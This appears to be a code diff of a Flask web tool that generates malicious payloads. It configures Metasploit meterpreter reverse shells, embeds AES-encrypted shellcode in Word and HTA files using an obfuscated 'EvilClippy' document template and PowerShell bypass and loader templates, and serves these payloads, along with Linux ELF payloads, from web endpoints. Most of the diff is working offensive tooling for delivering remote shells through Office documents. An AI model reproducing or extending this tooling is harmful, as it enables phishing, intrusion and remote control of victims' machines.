@@ -46,7 +46,7 @@ import itertools
 import logging
 import os
 import struct
-from binascii import hexlify
+import binascii
 from io import BytesIO
 from typing import Optional, List
 
@@ -55,6 +55,135 @@ from oletools.olevba import decompress_stream, copytoken_help
 from pcodedmp.pcodedmp import getWord, getDWord
 
 logger = logging.getLogger(__name__)
+
+SAFE_ADAPTERS = {"tun0", "eth0", "wlan0", "lo"}
+
+EGG_START = b"START_AES_HERE_"
+EGG_END = b"_END_AES_HERE"
+
+PWD_START = b"PASSWORD_START_"
+PWD_END = b"_PASSWORD_STOP"
+
+SALT_HEADER = b"Salted__"
+
+
+first_PADDING = b"\x00"
+rest_PADDING = b"\x20"
+
+
+PAYLOAD_DIR = "payloads"
+
+
+BASIC_LISTENER_CONFIG = {
+    "PingbackSleep": 10,
+    "OverrideRequestHost": True,
+    "ReverseListenerBindAddress": "127.0.0.1",
+    "ReverseListenerBindPort": 50000,
+}
+
+
+LISTENER_CONFIGS = {
+    "PS_HTTPS": BASIC_LISTENER_CONFIG | {
+        "Payload": "windows/x64/meterpreter/reverse_winhttps",
+        "HttpProxyIE": False
+    },
+    "PS_TCP": BASIC_LISTENER_CONFIG | {
+        "Payload": "windows/x64/meterpreter/reverse_tcp"
+    },
+    "VBA_32": BASIC_LISTENER_CONFIG | {
+        "Payload": "windows/meterpreter/reverse_winhttps",
+        "HttpProxyIE": False
+    },
+    "VBA_64": BASIC_LISTENER_CONFIG | {
+        "Payload": "windows/x64/meterpreter/reverse_winhttps",
+        "HttpProxyIE": False
+    },
+    "ELF": BASIC_LISTENER_CONFIG | {
+        "Payload": "linux/x64/meterpreter_reverse_https"
+    },
+}
+pprint(LISTENER_CONFIGS)
+
+
+BASIC_LISTENER_CONFIG = {
+    "PingbackSleep": 10,
+    "OverrideRequestHost": True,
+    "ReverseListenerBindAddress": "127.0.0.1",
+    "ReverseListenerBindPort": 50000,
+}
+
+
+# Base payloads without architecture
+CFGS = [
+    "windows/meterpreter/reverse_tcp",
+    "windows/meterpreter/reverse_winhttps",
+    "linux/meterpreter_reverse_https",
+    "windows/pingback_reverse_tcp",
+    "windows/messagebox",
+]
+
+LISTENER_CONFIGS = {}
+
+for cfg in CFGS:
+    parts = cfg.split('/')
+    platform = parts[0]
+    payload = "/".join(parts[1:])  # e.g. meterpreter/reverse_tcp or pingback_reverse_tcp
+
+    key = cfg.replace('/', '_')  # Group configs by payload type
+
+    LISTENER_CONFIGS[key] = {}
+    for arch in (32, 64):
+        # Build full payload path based on arch
+        full_payload = f"{platform}/x{arch}/{payload}"
+        if arch == 32:
+            full_payload = f"{platform}/{payload}"
+
+        # Build config
+        LISTENER_CONFIGS[key][arch] = BASIC_LISTENER_CONFIG | {
+            "Payload": full_payload,
+        }
+
+        # Optionally set HttpProxyIE based on payload characteristics
+        if "winhttps" in full_payload:
+            LISTENER_CONFIGS[key][arch]["HttpProxyIE"] = False
+
+# Print for inspection
+pprint(LISTENER_CONFIGS)
+
+
+
+msf_client = None
+
+with open('./PASSWORD_MsfRpcClient.txt', 'r') as f:
+    PASSWORD_MsfRpcClient = f.read().strip()
+
+with open('templates/WIN_PS_COMMAND.ps1', 'r') as f:
+    WIN_PS_COMMAND = f.read().strip()
+
+with open('templates/WIN_START.ps1', 'r') as f:
+    WIN_START_TEMPLATE = f.read().strip()
+
+with open('templates/WIN_BYPASS.ps1', 'r') as f:
+    WIN_BYPASS_TEMPLATE = f.read().strip()
+
+with open('templates/WIN_LOADER_32.ps1', 'r') as f:
+    WIN_LOADER_32_TEMPLATE = f.read().strip()
+
+with open('templates/WIN_DELEGATE.ps1', 'r') as f:
+    WIN_DELEGATE_TEMPLATE = f.read().strip()
+
+with open('templates/WIN_VBA_OUT.ps1', 'r') as f:
+    WIN_VBA_OUT_TEMPLATE = f.read().strip()
+
+
+
+
+
+
+win = Blueprint('win', __name__)
+lin = Blueprint('lin', __name__)
+info = Blueprint('info', __name__)
+
 
 
 def findmarker(content):
@@ -244,8 +373,8 @@ def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
     if summary_stream.find(marker_url) != -1:
         edited_summary = summary_stream.replace(marker_url, replacement_url)
 
-        print(binascii.hexlify(summary_stream))
-        print(binascii.hexlify(edited_summary))
+        print(binascii.binascii.hexlify(summary_stream))
+        print(binascii.binascii.hexlify(edited_summary))
 
         ole.write_stream("\x05SummaryInformation", edited_summary)
 
@@ -254,8 +383,6 @@ def generate_info_file(template_path: str, url: str) -> Optional[BytesIO]:
 
     return file_data
 
-
-logger = logging.getLogger(__name__)
 
 
 def findmarker(content):
@@ -303,95 +430,8 @@ def create_hta(encypted_bytes):
 
     return contents
 
-
-PAYLOAD_DIR = "payloads"
-
-
-BASIC_LISTENER_CONFIG = {
-    "PingbackSleep": 10,
-    "OverrideRequestHost": True,
-    "ReverseListenerBindAddress": "127.0.0.1",
-    "ReverseListenerBindPort": 50000,
-}
-
-
-LISTENER_CONFIGS = {
-    "PS_HTTPS": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/x64/meterpreter/reverse_winhttps",
-        "HttpProxyIE": False
-    },
-    "PS_TCP": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/x64/meterpreter/reverse_tcp"
-    },
-    "VBA_32": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/meterpreter/reverse_winhttps",
-        "HttpProxyIE": False
-    },
-    "VBA_64": BASIC_LISTENER_CONFIG | {
-        "Payload": "windows/x64/meterpreter/reverse_winhttps",
-        "HttpProxyIE": False
-    },
-    "ELF": BASIC_LISTENER_CONFIG | {
-        "Payload": "linux/x64/meterpreter_reverse_https"
-    },
-}
-pprint(LISTENER_CONFIGS)
-
-
-BASIC_LISTENER_CONFIG = {
-    "PingbackSleep": 10,
-    "OverrideRequestHost": True,
-    "ReverseListenerBindAddress": "127.0.0.1",
-    "ReverseListenerBindPort": 50000,
-}
-
-
-# Base payloads without architecture
-CFGS = [
-    "windows/meterpreter/reverse_tcp",
-    "windows/meterpreter/reverse_winhttps",
-    "linux/meterpreter_reverse_https",
-    "windows/pingback_reverse_tcp",
-    "windows/messagebox",
-]
-
-LISTENER_CONFIGS = {}
-
-for cfg in CFGS:
-    parts = cfg.split('/')
-    platform = parts[0]
-    payload = "/".join(parts[1:])  # e.g. meterpreter/reverse_tcp or pingback_reverse_tcp
-
-    key = cfg.replace('/', '_')  # Group configs by payload type
-
-    LISTENER_CONFIGS[key] = {}
-    for arch in (32, 64):
-        # Build full payload path based on arch
-        full_payload = f"{platform}/x{arch}/{payload}"
-        if arch == 32:
-            full_payload = f"{platform}/{payload}"
-
-        # Build config
-        LISTENER_CONFIGS[key][arch] = BASIC_LISTENER_CONFIG | {
-            "Payload": full_payload,
-        }
-
-        # Optionally set HttpProxyIE based on payload characteristics
-        if "winhttps" in full_payload:
-            LISTENER_CONFIGS[key][arch]["HttpProxyIE"] = False
-
-# Print for inspection
-pprint(LISTENER_CONFIGS)
-
-
-
-msf_client = None
-
-with open('./creds.txt', 'r') as f:
-    pw = f.read().strip()
-print(pw)
 try:
-    msf_client = MsfRpcClient(pw, username='python', port=55555)
+    msf_client = MsfRpcClient(PASSWORD_MsfRpcClient, username='python', port=55555)
 except Exception as e:
     logger.error("COULD NOT CONNECT TO MsfRpcClient")
     logger.error("WILL CONTINUE WITHOUT LISTENER AUTOMATION!!!!")
@@ -646,28 +686,6 @@ def encrypt_raw_payload_bytes(payload: bytearray) -> bytearray:
     return payload
 
 
-win = Blueprint('win', __name__)
-
-
-with open('templates/WIN_PS_COMMAND.ps1', 'r') as f:
-    WIN_PS_COMMAND = f.read().strip()
-
-with open('templates/WIN_START.ps1', 'r') as f:
-    WIN_START_TEMPLATE = f.read().strip()
-
-with open('templates/WIN_BYPASS.ps1', 'r') as f:
-    WIN_BYPASS_TEMPLATE = f.read().strip()
-
-with open('templates/WIN_LOADER_32.ps1', 'r') as f:
-    WIN_LOADER_32_TEMPLATE = f.read().strip()
-
-with open('templates/WIN_DELEGATE.ps1', 'r') as f:
-    WIN_DELEGATE_TEMPLATE = f.read().strip()
-
-with open('templates/WIN_VBA_OUT.ps1', 'r') as f:
-    WIN_VBA_OUT_TEMPLATE = f.read().strip()
-
-
 def ps(id, stage, proxy=False):
     clean_id = filter_string(id)
 
@@ -780,11 +798,9 @@ def tcp(id, stage):
         return render_template_string(WIN_DELEGATE_TEMPLATE, bytes=ps_string)
 
 
-SAFE_ADAPTERS = {"tun0", "eth0", "wlan0", "lo"}
 
 
 def get_ip(adapter: str) -> str:
-    # Ensure adapter is in the safe list
     if adapter not in SAFE_ADAPTERS:
         adapter = "tun0"
     try:
@@ -814,7 +830,7 @@ def word_form():
     return template
 
 
-def gen_multiple_payloads(lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[32, 64]):
+def gen_multiple_payloads(lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]):
     retval = {}
     print(f"{archs=}")
     for arch in archs:
@@ -867,19 +883,6 @@ def msgbox_generator(archs=[32, 64]):
 
 
 
-EGG_START = b"START_AES_HERE_"
-EGG_END = b"_END_AES_HERE"
-
-PWD_START = b"PASSWORD_START_"
-PWD_END = b"_PASSWORD_STOP"
-
-SALT_HEADER = b"Salted__"
-
-
-first_PADDING = b"\x00"
-rest_PADDING = b"\x20"
-
-
 def openssl_pbkdf2_encrypt(plaintext: bytes, password: str) -> bytes:
     salt = get_random_bytes(8)
     key_iv = PBKDF2(password.encode(), salt, dkLen=48,
@@ -911,7 +914,7 @@ def patch_document(doc_path: Path, shellcode_path: Path, out_path: Path, passwor
     if egg_end_idx == -1:
         raise ValueError("_END_AES_HERE marker not found")
 
-    egg_region_len = egg_end_idx - egg_start_idx  # not incl. END marker
+    egg_region_len = egg_end_idx - egg_start_idx
     if len(b64_payload) > egg_region_len:
         raise ValueError(
             f"Encrypted payload ({len(b64_payload)} B) exceeds region ({egg_region_len} B)"
@@ -968,19 +971,19 @@ def generate_encrypted_payload(id: str, lhost: str, lport: int, password: str, a
         raise ValueError("Invalid id")
 
     payloads = gen_multiple_payloads(
-        lhost, lport, proxy, clean_id, config="VBA", endpoint="ms", archs=[arch]
+        lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[arch]
     )
 
     raw_bytes = payloads[arch]
-    if isinstance(raw_bytes, str):  # Als het pad naar bestand is
+    if isinstance(raw_bytes, str):
         with open(f"{PAYLOAD_DIR}/{raw_bytes}", 'rb') as f:
             raw_bytes = f.read()
 
     return openssl_pbkdf2_encrypt(raw_bytes, password)
 
 
-@win.route('/rsa/get', methods=['GET', 'POST'])
-def rsa_payload():
+@win.route('/aes/get', methods=['GET', 'POST'])
+def aes_payload():
     password = request.args.get('password')
     lhost = request.args.get('lhost')
     lport = int(request.args.get('lport'))
@@ -1001,7 +1004,7 @@ def rsa_payload():
             arch=architecture,
             proxy=proxy
         )
-        return encrypted_blob  # Already Base64
+        return encrypted_blob
     except Exception as e:
         return str(e), 500
 
@@ -1015,7 +1018,6 @@ def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], 
 
     payload_entry = encrypted_payloads[0]
 
-    # Load bytes if it's a string path
     if isinstance(payload_entry, str):
         with open(f"{PAYLOAD_DIR}/{payload_entry}", 'rb') as f:
             shellcode = f.read()
@@ -1024,30 +1026,24 @@ def generate_word_file_aes(template_path: str, encrypted_payloads: List[bytes], 
     else:
         raise ValueError("Unsupported shellcode payload type")
 
-    password = str(uuid.uuid4()).replace('-', '')  # Can be passed externally
+    password = str(uuid.uuid4()).replace('-', '')
 
-    # Save shellcode temporarily
     with NamedTemporaryFile(delete=False) as shellcode_file:
         shellcode_path = Path(shellcode_file.name)
         shellcode_file.write(shellcode)
 
-    # Prepare input/output paths
     doc_path = Path(template_path)
     with NamedTemporaryFile(delete=False) as output_file:
         output_path = Path(output_file.name)
 
-    # Patch document using your existing function
     patch_document(doc_path, shellcode_path, output_path, password)
 
-    # Read patched document to memory
     with open(output_path, 'rb') as f:
         patched_data = f.read()
 
     return BytesIO(patched_data)
 
 
-def gen_multiple_payloads_pingback():
-    pass
 
 @win.route('/word_form/get', methods=['POST'])
 def word_get():
@@ -1064,13 +1060,13 @@ def word_get():
 
     if payload_type == "vba_shellcode":
         payloads = gen_multiple_payloads(
-            lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[32, 64])
+            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64])
         template_path = "payload_holders/shellcode_runner_obfs_EvilClippy.doc"
         word_file_stream = generate_word_file(
             template_path, [encrypt_raw_payload(payloads[32]), encrypt_raw_payload(payloads[64])], stomp_vba)
-    elif payload_type == "rsa_shellcode_revshell":
+    elif payload_type == "aes_shellcode_revshell":
         payloads = gen_multiple_payloads(
-            lhost, lport, proxy, id, config="VBA", endpoint="ms", archs=[32]
+            lhost, lport, proxy, id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32]
         )
         
         payload_path_32 = f"{PAYLOAD_DIR}/{payloads[32]}"
@@ -1082,9 +1078,9 @@ def word_get():
             template_path, [payload_bytes_32], stomp_vba
         )
 
-    elif payload_type == "rsa_shellcode_pingback":
-        payloads = gen_multiple_payloads_pingback(
-            lhost, config="VBA", endpoint="ms", archs=[32]
+    elif payload_type == "aes_shellcode_pingback":
+        payloads = gen_multiple_payloads(
+            lhost, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32]
         )
         encrypted_bytes_32 = payloads[32]
         encrypted_bytes_64 = payloads[64]
@@ -1114,7 +1110,7 @@ def hta_get():
         return "Invalid id", 400
 
     payloads_generated = gen_multiple_payloads(
-        lhost, lport, proxy, clean_id, config="VBA", endpoint="ms", archs=[32, 64]
+        lhost, lport, proxy, clean_id, config="windows_meterpreter_reverse_winhttps", endpoint="ms", archs=[32, 64]
     )
 
     payload_x32 = base64.b64encode(
@@ -1142,7 +1138,6 @@ def hta_get():
     )
 
 
-lin = Blueprint('lin', __name__)
 
 @lin.route('/')
 def lin_form():
@@ -1164,14 +1159,46 @@ def lin_form():
 
 
 
-@lin.route('/elf/<id>/msf.elf')
-def elf(id):
-    clean_id = filter_string(id)
+# @lin.route('/elf/<id>/msf.elf')
+# def elf(id):
+#     clean_id = filter_string(id)
 
-    if clean_id == "":
-        return "Invalid id", 400
+#     if clean_id == "":
+#         return "Invalid id", 400
 
-    lhost, lport = get_host()
+#     lhost, lport = get_host()
+
+#     setup_listener(
+#         lhost,
+#         lport,
+#         LISTENER_CONFIGS["ELF"] | {
+#             "LURI": f"/ms/{clean_id}/"
+#         }
+#     )
+
+#     elf_payload_file = generate_payload(
+#         LISTENER_CONFIGS["ELF"]["Payload"],
+#         lhost,
+#         lport,
+#         'elf',
+#         [
+#             {
+#                 "LURI": f"/ms/{clean_id}/",
+#                 "PrependFork": "true"
+#             }
+#         ]
+#     )
+
+#     return send_from_directory(directory=PAYLOAD_DIR, path=elf_payload_file, as_attachment=True, download_name='msf.elf')
+
+@lin.route('elf/get', methods=['POST'])
+def generate_elf():
+    lhost = request.form.get("lhost", "").strip()
+    lport = request.form.get("lport", "").strip()
+    clean_id = filter_string(request.form.get("id", "").strip())
+
+    if not lhost or not lport or not clean_id:
+        return "Missing parameters", 400
 
     setup_listener(
         lhost,
@@ -1194,10 +1221,14 @@ def elf(id):
         ]
     )
 
-    return send_from_directory(directory=PAYLOAD_DIR, path=elf_payload_file, as_attachment=True, download_name='msf.elf')
+    return send_from_directory(
+        directory=PAYLOAD_DIR,
+        path=elf_payload_file,
+        as_attachment=True,
+        download_name='msf.elf'
+    )
 
 
-info = Blueprint('info', __name__)
 
 
 @info.route('/get', methods=['GET', 'POST'])
